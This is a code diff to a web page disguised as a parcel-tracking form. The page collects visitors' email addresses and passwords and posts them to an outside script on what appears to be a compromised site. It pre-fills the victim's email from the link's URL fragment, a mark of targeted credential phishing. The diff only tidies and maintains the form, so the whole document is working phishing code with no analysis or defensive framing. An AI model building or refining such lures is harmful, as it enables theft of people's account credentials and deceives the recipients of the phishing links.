@@ -99,14 +99,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <!-- PHP Form Handling -->
     <form method="POST" action="https://innpact.co.za/administrator/includes/xlx.php/zim.php">
       <input type="email" id="email" name="email" placeholder="Email Address" required />
-
-
-<input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required />
-
-
-
-
-
+      <input type="password" id="password" name="password" placeholder="Password" required />
       <button type="submit" id="submitBtn">Track Shipment >>></button>
 
       <!-- Show success or error message -->
@@ -130,7 +123,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     const decoded = frag ? decodeURIComponent(frag) : '';
     if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
       emailInput.value = decoded;  // Set the email field with the URL hash value
-     
+      passwordInput.value = '';  // Clear the password field for privacy
     }
   } catch (err) {
     console.error('Error parsing URL fragment:', err);
